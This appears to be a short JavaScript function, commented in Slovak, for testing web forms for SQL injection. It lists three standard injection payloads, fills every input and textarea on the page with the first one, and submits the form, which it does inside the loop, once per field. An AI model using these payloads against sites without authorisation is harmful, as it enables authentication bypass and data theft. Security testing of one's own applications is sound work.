// Funkcia na testovanie SQL Injection
function testSQLInjection() {
  const sqlPayloads = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL --",
    "' OR 'a'='a"
  ];

  const formInputs = document.querySelectorAll('input, textarea');
  formInputs.forEach(input => {
    // Vložte SQL injection do vstupného poľa
    input.value = sqlPayloads[0];  // Používa prvý payload z poľa

    // Môžete pridať logiku na overenie reakcie po odoslaní formulára
    const form = document.querySelector('form');
    if (form) {
      form.submit();  // Odoslať formulár
    }
  });
}
